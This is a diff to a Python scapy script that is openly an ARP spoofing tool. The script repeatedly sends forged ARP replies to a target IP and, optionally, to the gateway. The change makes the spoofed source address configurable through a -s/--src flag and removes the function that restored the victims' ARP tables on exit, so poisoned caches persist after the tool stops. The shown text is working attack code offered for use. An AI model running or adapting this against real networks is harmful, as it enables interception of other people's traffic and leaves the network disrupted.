@@ -6,7 +6,7 @@ import time
 # sudo python3 main.py [args]
 
 target_ip = "192.168.1.135"  # Enter your target IP
-gateway_ip = "192.168.1.1"  # Enter your gateway's IP
+spoof_ip = "192.168.1.1"  # Enter your gateway's IP
 attack_gw = False
 delay = 2
 
@@ -25,28 +25,19 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
-def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
-
-
 def main():
     try:
         sent_packets_count = 0
         while True:
-            spoof(target_ip, gateway_ip)
+            spoof(target_ip, spoof_ip)
             if attack_gw:
-                spoof(gateway_ip, target_ip)
+                spoof(spoof_ip, target_ip)
             sent_packets_count = sent_packets_count + 1
             print("\r[*] Packets Sent " + str(sent_packets_count), end="")
             time.sleep(delay)  # Waits for two seconds
 
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
-        restore(gateway_ip, target_ip)
-        restore(target_ip, gateway_ip)
         print("[+] Arp Spoof Stopped")
 
 
@@ -78,5 +69,12 @@ if __name__ == "__main__":
             else:
                 index = sys.argv.index("--delay")
             delay = int(sys.argv[index + 1])
+        if "-s" in sys.argv or "--src" in sys.argv:
+            index = -1
+            if "-s" in sys.argv:
+                index = sys.argv.index("-s")
+            else:
+                index = sys.argv.index("--src")
+            spoof_ip = sys.argv[index + 1]
 
     main()
